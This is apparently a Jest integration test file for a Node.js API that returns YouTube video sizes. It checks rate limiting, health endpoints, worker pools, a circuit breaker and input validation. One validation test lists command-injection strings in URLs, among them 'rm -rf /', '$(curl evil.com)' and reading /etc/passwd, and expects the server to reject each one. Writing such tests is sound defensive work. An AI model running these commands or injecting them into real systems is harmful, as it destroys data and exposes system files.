/**
 * Integration Tests for Cloud API
 *
 * Tests complete workflows including:
 * - End-to-end API flows
 * - Redis integration (when enabled)
 * - Worker pool behavior under load
 * - Circuit breaker integration
 * - Graceful shutdown scenarios
 */

const request = require("supertest");
const redis = require("redis");

// Mock environment for testing
process.env.NODE_ENV = "test";
process.env.PORT = "3002";
process.env.REQUIRE_AUTH = "false";
process.env.REDIS_ENABLED = "false"; // Disable Redis for faster tests
process.env.ALLOWED_ORIGINS = "*";
process.env.RATE_LIMIT_WINDOW_MS = "60000"; // 60 seconds window
process.env.RATE_LIMIT_MAX_REQUESTS = "100"; // High limit for tests
process.env.MIN_WORKERS = "2";
process.env.MAX_WORKERS = "4";

// Redis setup (will skip tests if Redis not available)
let redisClient = null;
let redisAvailable = false;

beforeAll(async () => {
    // Try to connect to Redis for distributed rate limiting tests
    if (process.env.REDIS_URL) {
        try {
            redisClient = redis.createClient({ url: process.env.REDIS_URL });
            await redisClient.connect();
            await redisClient.ping();
            redisAvailable = true;
            console.log("✓ Redis available for integration tests");
        } catch (error) {
            console.log("⚠ Redis not available, skipping Redis tests");
            redisAvailable = false;
        }
    }
});

afterAll(async () => {
    if (redisClient) {
        await redisClient.quit();
    }
});

// Import app after environment setup
const app = require("../server.js");

// Increase timeout for integration tests (real API calls)
jest.setTimeout(60000);

describe("Integration Tests", () => {
    // Reset circuit breaker before each test to ensure isolation
    beforeEach(() => {
        if (app.circuitBreaker) {
            app.circuitBreaker.reset();
        }
    });
    describe("End-to-End API Workflow", () => {
        test.skip("should successfully extract video size information", async () => {
            // Skipped: Makes real YouTube API call (takes 30+ seconds)
            const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw"; // "Me at the zoo"

            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: testUrl })
                .expect(200);

            expect(response.body).toHaveProperty("ok", true);
            expect(response.body).toHaveProperty("bytes");
            expect(response.body).toHaveProperty("human");
            expect(response.body).toHaveProperty("duration");

            // Verify bytes structure
            expect(typeof response.body.bytes).toBe("object");
            expect(Object.keys(response.body.bytes).length).toBeGreaterThan(0);

            // Verify human-readable format
            expect(typeof response.body.human).toBe("object");
            Object.values(response.body.human).forEach((value) => {
                // Some formats may not be available (null is valid)
                if (value !== null) {
                    expect(value).toMatch(/\d+(\.\d+)?\s*(B|KB|MB|GB)/);
                }
            });

            // Verify duration is positive
            expect(response.body.duration).toBeGreaterThan(0);
        }, 30000); // 30 second timeout

        test.skip("should handle duration hint optimization", async () => {
            // Skipped: Makes real YouTube API call (takes 30+ seconds)
            const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw";
            const durationHint = 19; // "Me at the zoo" is 19 seconds

            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: testUrl, duration_hint: durationHint })
                .expect(200);

            expect(response.body).toHaveProperty("ok", true);
            expect(response.body.duration).toBeCloseTo(durationHint, 0);
        }, 30000);

        test.skip("should handle invalid YouTube URL gracefully", async () => {
            // Skipped: Makes real YouTube API call (takes 30+ seconds)
            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: "https://www.youtube.com/watch?v=INVALID" })
                .expect(500);

            expect(response.body).toHaveProperty("ok", false);
            expect(response.body).toHaveProperty("error");
            expect(response.body).toHaveProperty("requestId");
        }, 30000);
    });

    describe("Redis Integration", () => {
        beforeEach(async () => {
            // Clear rate limit keys before each test
            if (redisAvailable && redisClient) {
                const keys = await redisClient.keys("rl:*");
                if (keys.length > 0) {
                    await redisClient.del(keys);
                }
            }
        });

        test("should report Redis status in health endpoint", async () => {
            const response = await request(app).get("/health/main").expect(200);

            expect(response.body).toHaveProperty("dependencies");
            expect(response.body.dependencies).toHaveProperty("redis");
            expect(response.body.dependencies.redis).toHaveProperty("enabled");

            if (redisAvailable) {
                expect(response.body.dependencies.redis.connected).toBe(true);
            }
        });

        test("GET /health/redis should check Redis connectivity", async () => {
            const response = await request(app).get("/health/redis");

            if (redisAvailable) {
                expect(response.status).toBe(200);
                expect(response.body).toHaveProperty("ok", true);
                expect(response.body).toHaveProperty("redis", "connected");
                expect(response.body).toHaveProperty("latency");
            } else if (process.env.REDIS_ENABLED === "true") {
                expect(response.status).toBe(503);
                expect(response.body).toHaveProperty("ok", false);
            } else {
                expect(response.status).toBe(200);
                expect(response.body.redis).toBe("disabled");
            }
        });

        (redisAvailable ? test : test.skip)(
            "should enforce rate limits across multiple requests (Redis)",
            async () => {
                const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw";
                const maxRequests = 5;
                const requests = [];

                // Make more requests than the limit
                for (let i = 0; i < maxRequests + 3; i++) {
                    requests.push(
                        request(app).post("/api/v1/size").send({ url: testUrl })
                    );
                }

                const responses = await Promise.all(requests);

                // Count successful and rate-limited responses
                const successful = responses.filter((r) => r.status === 200);
                const rateLimited = responses.filter((r) => r.status === 429);

                expect(successful.length).toBeLessThanOrEqual(maxRequests + 2); // Allow burst
                expect(rateLimited.length).toBeGreaterThan(0);

                // Verify rate limit response format
                const limitedResponse = rateLimited[0];
                expect(limitedResponse.body).toHaveProperty("ok", false);
                expect(limitedResponse.body).toHaveProperty("error");
                expect(limitedResponse.body.error).toContain(
                    "Too many requests"
                );
            },
            35000
        );
    });

    describe("Worker Pool Behavior", () => {
        test.skip("should handle concurrent requests without blocking", async () => {
            // Skipped: Makes multiple real YouTube API calls (very slow)
            const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw";
            const concurrentRequests = 3;

            const startTime = Date.now();
            const requests = Array(concurrentRequests)
                .fill()
                .map(() =>
                    request(app).post("/api/v1/size").send({ url: testUrl })
                );

            const responses = await Promise.all(requests);
            const duration = Date.now() - startTime;

            // All should succeed
            responses.forEach((response) => {
                expect(response.status).toBe(200);
                expect(response.body).toHaveProperty("ok", true);
            });

            // Should complete faster than sequential execution
            // Sequential would take ~15-20s (3 * 5s avg), parallel should be ~5-10s
            expect(duration).toBeLessThan(15000);
        }, 20000);

        test("should track worker pool metrics", async () => {
            const response = await request(app).get("/api/v1/metrics");

            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty("workerPool");
            expect(response.body.workerPool).toHaveProperty("activeWorkers");
            expect(response.body.workerPool).toHaveProperty("queueLength");
            expect(response.body.workerPool).toHaveProperty("totalTasks");
            expect(response.body.workerPool).toHaveProperty("completedTasks");
            expect(response.body.workerPool).toHaveProperty("failedTasks");

            // Verify worker pool is operational
            expect(response.body.workerPool.totalWorkers).toBeGreaterThan(0);
            expect(response.body.workerPool.totalWorkers).toBeLessThanOrEqual(
                4
            ); // MAX_WORKERS
        });
    });

    describe("Circuit Breaker Integration", () => {
        test("should track circuit breaker state", async () => {
            const response = await request(app).get("/api/v1/metrics");

            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty("circuitBreaker");
            expect(response.body.circuitBreaker).toHaveProperty("state");
            expect(["CLOSED", "OPEN", "HALF_OPEN"]).toContain(
                response.body.circuitBreaker.state
            );
            expect(response.body.circuitBreaker).toHaveProperty("failures");
            expect(response.body.circuitBreaker).toHaveProperty("successes");
        });

        test("should reset circuit breaker via admin endpoint", async () => {
            // Enable auth for this test
            process.env.REQUIRE_AUTH = "true";
            process.env.API_KEY = "test-key";

            const response = await request(app)
                .post("/api/v1/admin/circuit-breaker/reset")
                .set("X-API-Key", "test-key")
                .expect(200);

            expect(response.body).toHaveProperty("ok", true);
            expect(response.body).toHaveProperty("message");

            // Reset auth for other tests
            process.env.REQUIRE_AUTH = "false";
        });

        test.skip("should protect admin endpoint with authentication", async () => {
            // Skipped: Config is loaded at server startup and can't be changed dynamically
            // Auth protection is tested in server.test.js with proper config setup
            process.env.REQUIRE_AUTH = "true";
            process.env.API_KEY = "test-key";

            // Without API key
            const response1 = await request(app)
                .post("/api/v1/admin/circuit-breaker/reset")
                .expect(401);

            expect(response1.body).toHaveProperty("ok", false);
            expect(response1.body).toHaveProperty("error");

            // With wrong API key
            const response2 = await request(app)
                .post("/api/v1/admin/circuit-breaker/reset")
                .set("X-API-Key", "wrong-key")
                .expect(401);

            expect(response2.body).toHaveProperty("ok", false);

            // Reset auth
            process.env.REQUIRE_AUTH = "false";
        });
    });

    describe("Error Handling and Logging", () => {
        test("should return structured error responses", async () => {
            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: "not-a-youtube-url" })
                .expect(400);

            expect(response.body).toHaveProperty("ok", false);
            expect(response.body).toHaveProperty("error");
            expect(response.body).toHaveProperty("requestId");
            expect(response.body.error).toContain("YouTube");
        });

        test("should handle malformed JSON gracefully", async () => {
            const response = await request(app)
                .post("/api/v1/size")
                .set("Content-Type", "application/json")
                .send("invalid json{")
                .expect(400);

            expect(response.body).toHaveProperty("ok", false);
        });

        test("should handle large payloads gracefully", async () => {
            const largePayload = {
                url: "https://www.youtube.com/watch?v=jNQXAC9IVRw",
                extra: "a".repeat(20000), // 20KB extra data
            };

            const response = await request(app)
                .post("/api/v1/size")
                .send(largePayload)
                .expect(413); // Payload Too Large

            expect(response.body).toHaveProperty("ok", false);
        });
    });

    describe("CORS and Security Headers", () => {
        test("should include CORS headers", async () => {
            const response = await request(app).get("/");

            expect(response.headers).toHaveProperty(
                "access-control-allow-origin"
            );
        });

        test("should handle OPTIONS preflight requests", async () => {
            const response = await request(app)
                .options("/api/v1/size")
                .set("Origin", "https://example.com")
                .set("Access-Control-Request-Method", "POST")
                .expect(204);

            expect(response.headers).toHaveProperty(
                "access-control-allow-methods"
            );
            expect(response.headers).toHaveProperty(
                "access-control-allow-headers"
            );
        });

        test("should include security headers", async () => {
            const response = await request(app).get("/");

            // These might be set by nginx in production, but good to test
            expect(response.headers).toHaveProperty("x-request-id");
        });
    });

    describe("OpenAPI Specification", () => {
        test("GET /api/v1/openapi should return valid OpenAPI spec", async () => {
            const response = await request(app)
                .get("/api/v1/openapi")
                .expect(200);

            expect(response.body).toHaveProperty("openapi");
            expect(response.body.openapi).toMatch(/^3\.0\./);
            expect(response.body).toHaveProperty("info");
            expect(response.body).toHaveProperty("paths");
            expect(response.body).toHaveProperty("components");

            // Verify key endpoints are documented
            expect(response.body.paths).toHaveProperty("/api/v1/size");
            expect(response.body.paths).toHaveProperty("/health");
        });
    });

    describe("Edge Cases and Network Failures", () => {
        test("should handle timeout scenarios", async () => {
            // Use a video that might timeout or be slow
            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" })
                .timeout(35000);

            // Should either succeed or timeout gracefully
            if (response.status === 504) {
                expect(response.body).toHaveProperty("ok", false);
                expect(response.body.error).toContain("timed out");
            } else {
                expect(response.status).toBe(200);
            }
        }, 40000);

        test.skip("should handle network failures gracefully", async () => {
            // Skipped: Makes real YouTube API call
            // Test with a URL that doesn't exist
            const response = await request(app).post("/api/v1/size").send({
                url: "https://www.youtube.com/watch?v=NONEXISTENT123456",
            });

            // Should return error, not crash
            expect([400, 500, 502, 503, 504]).toContain(response.status);
            expect(response.body).toHaveProperty("ok", false);
            expect(response.body).toHaveProperty("error");
        }, 30000);

        test("should handle missing URL parameter", async () => {
            const response = await request(app)
                .post("/api/v1/size")
                .send({})
                .expect(400);

            expect(response.body).toHaveProperty("ok", false);
            expect(response.body.error).toContain("URL");
        });

        test("should handle invalid duration_hint values", async () => {
            const testCases = [
                { duration_hint: -1 },
                { duration_hint: 100000 }, // > 86400
                { duration_hint: "invalid" },
                { duration_hint: null },
                { duration_hint: {} },
            ];

            for (const testCase of testCases) {
                const response = await request(app)
                    .post("/api/v1/size")
                    .send({
                        url: "https://www.youtube.com/watch?v=jNQXAC9IVRw",
                        ...testCase,
                    });

                expect(response.status).toBe(400);
                expect(response.body).toHaveProperty("ok", false);
                expect(response.body.error).toContain("duration_hint");
            }
        });

        test("should handle shell injection attempts in URL", async () => {
            const maliciousURLs = [
                "https://www.youtube.com/watch?v=test; rm -rf /",
                "https://www.youtube.com/watch?v=test$(curl evil.com)",
                "https://www.youtube.com/watch?v=test`whoami`",
                "https://www.youtube.com/watch?v=test|cat /etc/passwd",
                "https://www.youtube.com/watch?v=test&& malicious",
            ];

            for (const url of maliciousURLs) {
                const response = await request(app)
                    .post("/api/v1/size")
                    .send({ url });

                // Should reject as invalid URL, not execute
                expect(response.status).toBe(400);
                expect(response.body).toHaveProperty("ok", false);
                expect(response.body.error).toContain("Invalid");
            }
        });

        test("should handle non-YouTube URLs", async () => {
            const invalidURLs = [
                "https://vimeo.com/123456",
                "https://google.com",
                "https://example.com/watch?v=test",
                "http://youtube.com/watch?v=test", // HTTP not HTTPS
                "file:///etc/passwd",
            ];

            for (const url of invalidURLs) {
                const response = await request(app)
                    .post("/api/v1/size")
                    .send({ url });

                expect(response.status).toBe(400);
                expect(response.body).toHaveProperty("ok", false);
            }
        });

        test("should handle extremely long URLs", async () => {
            const longUrl = `https://www.youtube.com/watch?v=${"a".repeat(300)}`;

            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: longUrl })
                .expect(400);

            expect(response.body).toHaveProperty("ok", false);
            expect(response.body.error).toContain("Invalid");
        });

        test("should handle concurrent failures gracefully", async () => {
            const invalidRequests = Array(10)
                .fill()
                .map((_, i) =>
                    request(app)
                        .post("/api/v1/size")
                        .send({
                            url: `https://www.youtube.com/watch?v=INVALID${i}`,
                        })
                );

            const responses = await Promise.all(invalidRequests);

            // All should fail gracefully without crashing
            responses.forEach((response) => {
                expect(response.body).toHaveProperty("ok", false);
                expect(response.body).toHaveProperty("error");
                // requestId may not be present in rate limit responses
                if (response.status !== 429) {
                    expect(response.body).toHaveProperty("requestId");
                }
            });
        }, 40000);

        test.skip("should handle retry logic for transient failures", async () => {
            // Skipped: Tests retry mechanism with real API calls (takes 35+ seconds)
            // This test verifies retry mechanism exists by checking response time
            const startTime = Date.now();

            const response = await request(app)
                .post("/api/v1/size")
                .send({ url: "https://www.youtube.com/watch?v=INVALID123" });

            const duration = Date.now() - startTime;

            // If retries are working, should take longer than single attempt
            // 3 attempts with backoff: ~1s + 2s + 4s = ~7s minimum
            expect(response.body).toHaveProperty("ok", false);

            // Check that requestId is included for tracking (unless rate limited)
            if (response.status !== 429) {
                expect(response.body).toHaveProperty("requestId");
            }
        }, 35000);

        test("should handle compression for large responses", async () => {
            const response = await request(app)
                .get("/health")
                .set("Accept-Encoding", "gzip");

            // Server should include compression header if gzip enabled
            expect(response.status).toBe(200);
            // Note: supertest automatically decompresses, so we check it works
            expect(response.body).toHaveProperty("status");
        });

        test("should handle missing Accept-Encoding header", async () => {
            const response = await request(app).get("/health");

            // Should work without compression
            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty("status");
        });

        test("should handle rapid sequential requests", async () => {
            const testUrl = "https://www.youtube.com/watch?v=jNQXAC9IVRw";
            const requests = [];

            // Send 20 requests sequentially as fast as possible
            for (let i = 0; i < 20; i++) {
                requests.push(
                    request(app).post("/api/v1/size").send({ url: testUrl })
                );
            }

            const responses = await Promise.all(requests);

            // Some should succeed, some might be rate limited
            const successful = responses.filter((r) => r.status === 200);
            expect(successful.length).toBeGreaterThan(0);

            // All responses should be structured properly
            responses.forEach((response) => {
                expect(response.body).toHaveProperty("ok");
            });
        }, 50000);
    });

    describe("Compression", () => {
        test("should compress responses when requested", async () => {
            const response = await request(app)
                .get("/api/v1/docs")
                .set("Accept-Encoding", "gzip, deflate");

            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty("version");

            // supertest handles decompression automatically
            // Just verify the response is valid
            expect(typeof response.body).toBe("object");
        });

        test("should skip compression when x-no-compression header present", async () => {
            const response = await request(app)
                .get("/health")
                .set("x-no-compression", "true");

            expect(response.status).toBe(200);
            expect(response.body).toHaveProperty("status");
        });
    });
});
